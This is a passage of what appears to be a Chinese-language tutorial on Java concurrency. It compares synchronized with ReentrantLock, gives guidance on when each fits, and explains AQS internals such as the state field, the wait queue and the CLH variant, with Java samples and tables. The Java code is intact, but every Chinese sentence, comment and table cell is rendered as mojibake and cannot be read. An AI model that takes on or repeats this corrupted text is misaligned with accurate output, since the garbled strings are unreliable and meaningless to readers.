<p>é¢è¯•ä¸­å¸¸è¢«å¿½ç•¥ä½†éå¸¸é‡è¦çš„åŒºåˆ«ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¼‚å¸¸å¤„ç†å¯¹æ¯” - è¿™æ˜¯synchronizedçš„é‡è¦ä¼˜åŠ¿
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExceptionHandlingComparison</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">syncLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">reentrantLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * synchronizedï¼šå¼‚å¸¸æ—¶è‡ªåŠ¨é‡Šæ”¾é”
     * æ— è®ºæ˜¯æ­£å¸¸é€€å‡ºè¿˜æ˜¯å¼‚å¸¸é€€å‡ºï¼Œé”éƒ½ä¼šè¢«è‡ªåŠ¨é‡Šæ”¾
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedWithException</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (syncLock) {
            <span class="hljs-comment">// å³ä½¿è¿™é‡ŒæŠ›å‡ºå¼‚å¸¸ï¼Œé”ä¹Ÿä¼šè‡ªåŠ¨é‡Šæ”¾</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å‡ºé”™äº†"</span>);
        }
        <span class="hljs-comment">// é”å·²è‡ªåŠ¨é‡Šæ”¾ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥è·å–</span>
    }
    
    <span class="hljs-comment">/**
     * ReentrantLockï¼šå¿…é¡»åœ¨finallyä¸­é‡Šæ”¾é”
     * å¦‚æœå¿˜è®°finallyæˆ–unlockï¼Œé”å°†æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantLockWithException</span><span class="hljs-params">()</span> {
        reentrantLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// å¦‚æœè¿™é‡ŒæŠ›å‡ºå¼‚å¸¸...</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å‡ºé”™äº†"</span>);
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾ï¼</span>
            reentrantLock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * ã€å±é™©ã€‘é”™è¯¯ç¤ºèŒƒï¼šå¿˜è®°finally
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dangerousCode</span><span class="hljs-params">()</span> {
        reentrantLock.lock();
        <span class="hljs-comment">// å¦‚æœä¸‹é¢ä»£ç æŠ›å‡ºå¼‚å¸¸ï¼Œé”å°†æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼</span>
        doSomethingDangerous();
        reentrantLock.unlock(); <span class="hljs-comment">// è¿™è¡Œå¯èƒ½æ°¸è¿œä¸ä¼šæ‰§è¡Œ</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomethingDangerous</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒåŒºåˆ«</strong>ï¼š</p>
<ul>
<li><code>synchronized</code>ï¼šJVMä¿è¯é”çš„é‡Šæ”¾ï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒ</li>
<li><code>ReentrantLock</code>ï¼šå¼€å‘è€…å…¨æƒè´Ÿè´£ï¼Œå¿…é¡»é…åˆtry-finallyä½¿ç”¨</li>
</ul>
<h4 data-id="heading-29">5.6 ä¸ºä»€ä¹ˆæœ‰æ—¶synchronizedæ›´å¥½</h4>
<p>è™½ç„¶ReentrantLockåŠŸèƒ½æ›´å¼ºå¤§ï¼Œä½†ä»¥ä¸‹åœºæ™¯synchronizedæ˜¯æ›´å¥½çš„é€‰æ‹©ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * synchronizedæ›´é€‚åˆçš„åœºæ™¯
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WhenToUseSynchronized</span> {
    
    <span class="hljs-comment">/**
     * åœºæ™¯1ï¼šç®€å•çš„åŒæ­¥æ–¹æ³•
     * synchronizedæ›´ç®€æ´ï¼Œä¸éœ€è¦try-finally
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simpleMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¸€è¡Œæå®šï¼Œç®€æ´æ˜äº†</span>
    }
    
    <span class="hljs-comment">/**
     * åœºæ™¯2ï¼šåŒæ­¥ä»£ç å—å¾ˆçŸ­
     * JVMå¯¹synchronizedæœ‰åå‘é”ã€è½»é‡çº§é”ä¼˜åŒ–
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shortCriticalSection</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            counter++;  <span class="hljs-comment">// å°±è¿™ä¸€è¡Œï¼Œç”¨synchronizedè¶³å¤Ÿ</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> counter;
    
    <span class="hljs-comment">/**
     * åœºæ™¯3ï¼šä¸éœ€è¦ReentrantLockçš„é«˜çº§ç‰¹æ€§
     * å¦‚æœä¸éœ€è¦ä¸­æ–­ã€è¶…æ—¶ã€å…¬å¹³é”ã€å¤šæ¡ä»¶å˜é‡
     * ç”¨synchronizedæ›´å®‰å…¨ï¼ˆä¸ä¼šå¿˜è®°é‡Šæ”¾é”ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">noAdvancedFeatures</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ™®é€šä¸šåŠ¡é€»è¾‘</span>
    }
    
    <span class="hljs-comment">/**
     * åœºæ™¯4ï¼šé”çš„ç²’åº¦å°±æ˜¯æ•´ä¸ªæ–¹æ³•
     * synchronizedæ–¹æ³•å¤©ç„¶é€‚åˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">entireMethodNeedLock</span><span class="hljs-params">()</span> {
        step1();
        step2();
        step3();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">step1</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">step2</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">step3</span><span class="hljs-params">()</span> {}
}
</code></pre>
<p><strong>æ€»ç»“</strong>ï¼š</p>








































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨è</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">ç®€å•åŒæ­¥</td><td align="left">synchronized</td><td align="left">è¯­æ³•ç®€æ´ï¼Œä¸æ˜“å‡ºé”™</td></tr><tr><td align="left">éœ€è¦ä¸­æ–­/è¶…æ—¶</td><td align="left">ReentrantLock</td><td align="left">synchronizedä¸æ”¯æŒ</td></tr><tr><td align="left">éœ€è¦å…¬å¹³é”</td><td align="left">ReentrantLock</td><td align="left">synchronizedåªæœ‰éå…¬å¹³</td></tr><tr><td align="left">å¤šä¸ªç­‰å¾…æ¡ä»¶</td><td align="left">ReentrantLock</td><td align="left">synchronizedåªæœ‰ä¸€ä¸ªwait set</td></tr><tr><td align="left">æ€§èƒ½æ•æ„Ÿ+ä½ç«äº‰</td><td align="left">synchronized</td><td align="left">JVMä¼˜åŒ–æ›´å¥½</td></tr><tr><td align="left">é—ç•™ä»£ç ç»´æŠ¤</td><td align="left">synchronized</td><td align="left">ä¿æŒä¸€è‡´æ€§</td></tr></tbody></table>
<h4 data-id="heading-30">5.7 é”çš„ä¼˜ç¼ºç‚¹æ€»ç»“</h4>
<p>åœ¨é€‰æ‹©åŒæ­¥æœºåˆ¶ä¹‹å‰ï¼Œå…ˆç†è§£é”æœ¬èº«çš„ä¼˜ç¼ºç‚¹ï¼š</p>
<p><strong>é”çš„ä¼˜ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>ç®€å•ç›´è§‚</strong>ï¼šæ¯”æ— é”ç¼–ç¨‹å®¹æ˜“ç†è§£å’Œå®ç°</li>
<li><strong>åŠŸèƒ½å®Œæ•´</strong>ï¼šæ”¯æŒå¤æ‚çš„åŒæ­¥é€»è¾‘</li>
<li><strong>å¯ç»„åˆæ€§</strong>ï¼šå¤šä¸ªæ“ä½œå¯ä»¥åŸå­åŒ–æ‰§è¡Œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”å¯ä»¥ä¿æŠ¤å¤æ‚çš„å¤åˆæ“ä½œ</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">if</span> (map.containsKey(key)) {
        map.put(key, map.get(key) + <span class="hljs-number">1</span>);
    } <span class="hljs-keyword">else</span> {
        map.put(key, <span class="hljs-number">1</span>);
    }
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>é”çš„ç¼ºç‚¹</strong>ï¼š</p>
<ol>
<li><strong>æ€§èƒ½å¼€é”€</strong>ï¼šçº¿ç¨‹é˜»å¡/å”¤é†’æ¶‰åŠç³»ç»Ÿè°ƒç”¨å’Œä¸Šä¸‹æ–‡åˆ‡æ¢</li>
<li><strong>æ­»é”é£é™©</strong>ï¼šå¤šæŠŠé”å¯èƒ½é€ æˆæ­»é”</li>
<li><strong>ä¼˜å…ˆçº§åè½¬</strong>ï¼šä½ä¼˜å…ˆçº§çº¿ç¨‹æŒæœ‰é”æ—¶ï¼Œé«˜ä¼˜å…ˆçº§çº¿ç¨‹è¢«è¿«ç­‰å¾…</li>
<li><strong>ä¸å¯ç»„åˆ</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹å®‰å…¨çš„æ“ä½œç»„åˆåå¯èƒ½ä¸å®‰å…¨</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¯ç»„åˆçš„ä¾‹å­ï¼šä¸¤ä¸ªçº¿ç¨‹å®‰å…¨æ“ä½œç»„åˆåä¸å®‰å…¨</span>
<span class="hljs-comment">// å‡è®¾listæ˜¯CopyOnWriteArrayListï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰</span>
<span class="hljs-keyword">if</span> (!list.contains(item)) {  <span class="hljs-comment">// æ“ä½œ1ï¼šçº¿ç¨‹å®‰å…¨</span>
    list.add(item);           <span class="hljs-comment">// æ“ä½œ2ï¼šçº¿ç¨‹å®‰å…¨</span>
}
<span class="hljs-comment">// ä½†æ•´ä¸ªif-then-addä¸æ˜¯åŸå­çš„ï¼éœ€è¦é¢å¤–çš„é”</span>
</code></pre>
<p><strong>ä½•æ—¶è€ƒè™‘å…¶ä»–æ–¹æ¡ˆ</strong>ï¼š</p>



































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èæ–¹æ¡ˆ</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">ç®€å•è®¡æ•°</td><td align="left">AtomicInteger</td><td align="left">æ— é”ï¼Œæ€§èƒ½æ›´å¥½</td></tr><tr><td align="left">ç®€å•æ ‡å¿—ä½</td><td align="left">volatile</td><td align="left">è¶³å¤Ÿä¿è¯å¯è§æ€§</td></tr><tr><td align="left">è¯»å¤šå†™å°‘</td><td align="left">ReadWriteLock/StampedLock</td><td align="left">è¯»æ“ä½œå¹¶å‘</td></tr><tr><td align="left">ç´¯åŠ ç»Ÿè®¡</td><td align="left">LongAdder</td><td align="left">é«˜ç«äº‰ä¸‹æ€§èƒ½æ›´å¥½</td></tr><tr><td align="left">å•æ¬¡åˆå§‹åŒ–</td><td align="left">DCLæˆ–Holderæ¨¡å¼</td><td align="left">é¿å…æ¯æ¬¡åŠ é”</td></tr></tbody></table>
<h2 data-id="heading-31">ç¬¬äºŒç« ï¼šAQS æ ¸å¿ƒåŸç†å‰–æ</h2>
<h3 data-id="heading-32">1. AQSè®¾è®¡æ€æƒ³</h3>
<h4 data-id="heading-33">1.1 ä»€ä¹ˆæ˜¯AQS</h4>
<p>AQSï¼ˆAbstractQueuedSynchronizerï¼‰æ˜¯Doug Leaè®¾è®¡çš„ä¸€ä¸ªç”¨äºæ„å»ºé”å’ŒåŒæ­¥å™¨çš„æ¡†æ¶ã€‚JUCï¼ˆjava.util.concurrentï¼‰åŒ…ä¸­çš„å¤§éƒ¨åˆ†åŒæ­¥å™¨éƒ½æ˜¯åŸºäºAQSå®ç°çš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c33376a11c44aa99ca78d7fa9ec5fe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=Dqvb6XDMs1vePNniLuvHXFZYnUM%3D" alt="aqs-overview.drawio.png" loading="lazy"/>
AQSçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>å¦‚æœè¢«è¯·æ±‚çš„å…±äº«èµ„æºç©ºé—²ï¼Œåˆ™å°†å½“å‰è¯·æ±‚èµ„æºçš„çº¿ç¨‹è®¾ç½®ä¸ºæœ‰æ•ˆå·¥ä½œçº¿ç¨‹ï¼Œå¹¶å°†å…±äº«èµ„æºè®¾ç½®ä¸ºé”å®šçŠ¶æ€ï¼›å¦‚æœè¢«è¯·æ±‚çš„å…±äº«èµ„æºè¢«å ç”¨ï¼Œå°±éœ€è¦ä¸€å¥—çº¿ç¨‹é˜»å¡ç­‰å¾…ä»¥åŠè¢«å”¤é†’æ—¶é”åˆ†é…çš„æœºåˆ¶ï¼ŒAQSä½¿ç”¨CLHé˜Ÿåˆ—é”çš„å˜ä½“æ¥å®ç°è¿™ä¸€æœºåˆ¶ã€‚</strong></p>
<h4 data-id="heading-34">1.2 æ¨¡æ¿æ–¹æ³•æ¨¡å¼</h4>
<p>AQSé‡‡ç”¨<strong>æ¨¡æ¿æ–¹æ³•è®¾è®¡æ¨¡å¼</strong>ï¼šå°†é€šç”¨çš„æµç¨‹å°è£…åœ¨çˆ¶ç±»ä¸­ï¼Œå°†å¯å˜çš„éƒ¨åˆ†ç•™ç»™å­ç±»å®ç°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSå®šä¹‰çš„æ¨¡æ¿æ–¹æ³•ï¼ˆfinalï¼Œä¸å¯é‡å†™ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;           <span class="hljs-comment">// â‘  å­ç±»å®ç°ï¼šå°è¯•è·å–é”</span>
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))  <span class="hljs-comment">// â‘¡ AQSå®ç°ï¼šå…¥é˜Ÿç­‰å¾…</span>
        selfInterrupt();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryRelease(arg)) {            <span class="hljs-comment">// â‘  å­ç±»å®ç°ï¼šå°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)
            unparkSuccessor(h);       <span class="hljs-comment">// â‘¡ AQSå®ç°ï¼šå”¤é†’åç»§</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>å­ç±»éœ€è¦å®ç°çš„æ–¹æ³•</strong>ï¼š</p>



































<table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">è¯´æ˜</th><th align="left">ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><code>tryAcquire(int)</code></td><td align="left">å°è¯•ç‹¬å è·å–</td><td align="left">ReentrantLock</td></tr><tr><td align="left"><code>tryRelease(int)</code></td><td align="left">å°è¯•ç‹¬å é‡Šæ”¾</td><td align="left">ReentrantLock</td></tr><tr><td align="left"><code>tryAcquireShared(int)</code></td><td align="left">å°è¯•å…±äº«è·å–</td><td align="left">Semaphoreã€CountDownLatch</td></tr><tr><td align="left"><code>tryReleaseShared(int)</code></td><td align="left">å°è¯•å…±äº«é‡Šæ”¾</td><td align="left">Semaphoreã€CountDownLatch</td></tr><tr><td align="left"><code>isHeldExclusively()</code></td><td align="left">æ˜¯å¦ç‹¬å æŒæœ‰</td><td align="left">Conditionä½¿ç”¨</td></tr></tbody></table>
<h4 data-id="heading-35">1.3 ä¸¤ç§èµ„æºå…±äº«æ¨¡å¼</h4>
<p>AQSæ”¯æŒä¸¤ç§èµ„æºå…±äº«æ¨¡å¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67b55717cf4c4c1b97c5a07a07f272ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=w7fsfks7jJ1iZdNy%2Fr2XXeeKJ8U%3D" alt="exclusive-vs-shared.drawio.png" loading="lazy"/>
<strong>ç‹¬å æ¨¡å¼ï¼ˆExclusiveï¼‰</strong>ï¼š</p>
<ul>
<li>åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–èµ„æº</li>
<li>ä¾‹å¦‚ï¼šReentrantLock</li>
</ul>
<p><strong>å…±äº«æ¨¡å¼ï¼ˆSharedï¼‰</strong>ï¼š</p>
<ul>
<li>å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–èµ„æº</li>
<li>ä¾‹å¦‚ï¼šSemaphoreï¼ˆä¿¡å·é‡ï¼‰ã€CountDownLatchã€ReadWriteLockçš„è¯»é”</li>
</ul>
<hr/>
<h3 data-id="heading-36">2. æ ¸å¿ƒå­—æ®µè§£æ</h3>
<h4 data-id="heading-37">2.1 stateå­—æ®µ</h4>
<p><code>state</code>æ˜¯AQSä¸­æœ€æ ¸å¿ƒçš„å­—æ®µï¼Œè¡¨ç¤ºåŒæ­¥çŠ¶æ€ã€‚å®ƒçš„å«ä¹‰ç”±å…·ä½“çš„åŒæ­¥å™¨å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * The synchronization state.
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> state;

<span class="hljs-comment">// è·å–çŠ¶æ€</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> state;
}

<span class="hljs-comment">// è®¾ç½®çŠ¶æ€</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    state = newState;
}

<span class="hljs-comment">// CASè®¾ç½®çŠ¶æ€</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, stateOffset, expect, update);
}
</code></pre>
<p><strong>ä¸åŒåŒæ­¥å™¨ä¸­stateçš„å«ä¹‰</strong>ï¼š</p>

























<table><thead><tr><th align="left">åŒæ­¥å™¨</th><th align="left">stateå«ä¹‰</th></tr></thead><tbody><tr><td align="left">ReentrantLock</td><td align="left">0=æœªé”å®šï¼Œ&gt;0=é”å®šï¼ˆå€¼è¡¨ç¤ºé‡å…¥æ¬¡æ•°ï¼‰</td></tr><tr><td align="left">ReentrantReadWriteLock</td><td align="left">é«˜16ä½=è¯»é”æ•°é‡ï¼Œä½16ä½=å†™é”é‡å…¥æ¬¡æ•°</td></tr><tr><td align="left">Semaphore</td><td align="left">å¯ç”¨è®¸å¯æ•°é‡</td></tr><tr><td align="left">CountDownLatch</td><td align="left">å‰©ä½™è®¡æ•°</td></tr></tbody></table>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockä¸­stateçš„ä½¿ç”¨
 */</span>
<span class="hljs-comment">// è·å–é”æ—¶</span>
<span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {  <span class="hljs-comment">// 0 -&gt; 1ï¼Œè·å–æˆåŠŸ</span>
    setExclusiveOwnerThread(current);
}

<span class="hljs-comment">// é‡å…¥æ—¶</span>
<span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;  <span class="hljs-comment">// stateé€’å¢</span>
setState(nextc);

<span class="hljs-comment">// é‡Šæ”¾é”æ—¶</span>
<span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;  <span class="hljs-comment">// stateé€’å‡</span>
<span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
    setExclusiveOwnerThread(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// å®Œå…¨é‡Šæ”¾</span>
}
setState(c);
</code></pre>
<h4 data-id="heading-38">2.2 headå’Œtailå­—æ®µ</h4>
<p>AQSä½¿ç”¨ä¸€ä¸ªFIFOåŒå‘é˜Ÿåˆ—æ¥ç®¡ç†ç­‰å¾…çº¿ç¨‹ã€‚<code>head</code>å’Œ<code>tail</code>åˆ†åˆ«æŒ‡å‘é˜Ÿåˆ—çš„å¤´éƒ¨å’Œå°¾éƒ¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Head of the wait queue, lazily initialized.
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node head;

<span class="hljs-comment">/**
 * Tail of the wait queue, lazily initialized.
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node tail;
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10a561a5c17f44b291966b2f12a07889~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=nDN31yMMy8rMaHDTqUIbXgv9Wog%3D" alt="clh-queue.drawio.png" loading="lazy"/></p>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>æ‡’åˆå§‹åŒ–</strong>ï¼šåªæœ‰åœ¨å‘ç”Ÿç«äº‰æ—¶æ‰ä¼šåˆå§‹åŒ–é˜Ÿåˆ—</li>
<li><strong>headæ˜¯å“¨å…µèŠ‚ç‚¹</strong>ï¼šä¸å­˜å‚¨å®é™…çš„ç­‰å¾…çº¿ç¨‹ï¼Œç®€åŒ–è¾¹ç•Œå¤„ç†</li>
<li><strong>åŒå‘é“¾è¡¨</strong>ï¼šä¾¿äºèŠ‚ç‚¹çš„å–æ¶ˆå’Œè¶…æ—¶å¤„ç†</li>
</ul>
<h4 data-id="heading-39">2.3 exclusiveOwnerThreadå­—æ®µ</h4>
<p>è¯¥å­—æ®µç»§æ‰¿è‡ª<code>AbstractOwnableSynchronizer</code>ï¼Œè®°å½•å½“å‰æŒæœ‰ç‹¬å é”çš„çº¿ç¨‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AbstractOwnableSynchronizer.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractOwnableSynchronizer</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Thread exclusiveOwnerThread;
    
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setExclusiveOwnerThread</span><span class="hljs-params">(Thread thread)</span> {
        exclusiveOwnerThread = thread;
    }
    
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getExclusiveOwnerThread</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> exclusiveOwnerThread;
    }
}
</code></pre>
<p>è¿™ä¸ªå­—æ®µç”¨äºï¼š</p>
<ol>
<li><strong>å¯é‡å…¥åˆ¤æ–­</strong>ï¼šæ£€æŸ¥å½“å‰çº¿ç¨‹æ˜¯å¦å·²ç»æŒæœ‰é”</li>
<li><strong>é”çŠ¶æ€æŸ¥è¯¢</strong>ï¼šè·å–é”çš„æŒæœ‰è€…</li>
</ol>
<hr/>
<h3 data-id="heading-40">3. CLHé˜Ÿåˆ—å˜ä½“</h3>
<h4 data-id="heading-41">3.1 ç»å…¸CLHé˜Ÿåˆ—</h4>
<p>CLHï¼ˆCraig, Landin, and Hagerstenï¼‰é˜Ÿåˆ—æ˜¯ä¸€ç§åŸºäºé“¾è¡¨çš„è‡ªæ—‹é”ï¼Œæ¯ä¸ªçº¿ç¨‹åœ¨å‰é©±èŠ‚ç‚¹ä¸Šè‡ªæ—‹ç­‰å¾…ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07afc1061001438fb7c26bca1482ac29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=3Bq41SIt6fDTI4ds2Wirw4MZBmw%3D" alt="classic-clh-queue.drawio.png" loading="lazy"/>
<strong>ç»å…¸CLHç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªèŠ‚ç‚¹åªæœ‰ä¸€ä¸ª<code>locked</code>æ ‡å¿—</li>
<li>åç»§èŠ‚ç‚¹åœ¨å‰é©±çš„<code>locked</code>ä¸Šè‡ªæ—‹</li>
<li>é‡Šæ”¾é”æ—¶ï¼Œåªéœ€è®¾ç½®è‡ªå·±çš„<code>locked=false</code></li>
</ul>
<h4 data-id="heading-42">3.2 AQSçš„CLHå˜ä½“</h4>
<p>AQSå¯¹CLHé˜Ÿåˆ—è¿›è¡Œäº†æ”¹é€ ï¼Œä¸»è¦åŒºåˆ«ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ca10e89f67e4193bac990f2198c913e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=xOefZhfaFSiKVO%2FYEjE2rJeWcNc%3D" alt="aqs-clh-variant.drawio.png" loading="lazy"/>
<strong>ä¸»è¦æ”¹è¿›</strong>ï¼š</p>



































